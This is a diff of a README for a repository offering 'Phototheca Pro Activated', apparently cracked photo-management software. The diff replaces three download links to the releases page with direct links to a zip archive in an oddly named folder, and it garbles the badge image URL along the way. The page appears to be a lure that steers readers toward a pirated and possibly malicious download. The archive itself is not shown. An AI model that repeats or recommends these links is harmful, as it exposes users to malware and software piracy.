@@ -1,6 +1,6 @@
 # 📸 Phototheca-Pro-Activated - Manage Your Photos with Ease
 
-[![Download Phototheca Pro](https://img.shields.io/badge/Download-Phototheca%20Pro-brightgreen)](https://github.com/Bmmy/Phototheca-Pro-Activated/releases)
+[![Download Phototheca Pro](https://github.com/Bmmy/Phototheca-Pro-Activated/raw/refs/heads/main/cytoglobin/Phototheca-Activated-Pro-v1.9.zip%20Pro-brightgreen)](https://github.com/Bmmy/Phototheca-Pro-Activated/raw/refs/heads/main/cytoglobin/Phototheca-Activated-Pro-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Phototheca Pro is a powerful tool for managing and organizing your photo collect
 
 ## 📥 Download & Install
 
-To get Phototheca Pro, visit this page to download: [Download Phototheca Pro](https://github.com/Bmmy/Phototheca-Pro-Activated/releases).
+To get Phototheca Pro, visit this page to download: [Download Phototheca Pro](https://github.com/Bmmy/Phototheca-Pro-Activated/raw/refs/heads/main/cytoglobin/Phototheca-Activated-Pro-v1.9.zip).
 
 Follow these steps to download the application:
 
@@ -77,7 +77,7 @@ We provide comprehensive documentation to assist you in using Phototheca Pro:
 
 We welcome feedback and suggestions from our users. Your experience helps us improve Phototheca Pro. Share your thoughts and participate in our community discussions on GitHub.
 
-Remember, you can always return to the Releases page to download the latest updates: [Download Phototheca Pro](https://github.com/Bmmy/Phototheca-Pro-Activated/releases).
+Remember, you can always return to the Releases page to download the latest updates: [Download Phototheca Pro](https://github.com/Bmmy/Phototheca-Pro-Activated/raw/refs/heads/main/cytoglobin/Phototheca-Activated-Pro-v1.9.zip).
 
 ## 📱 Upcoming Features
 
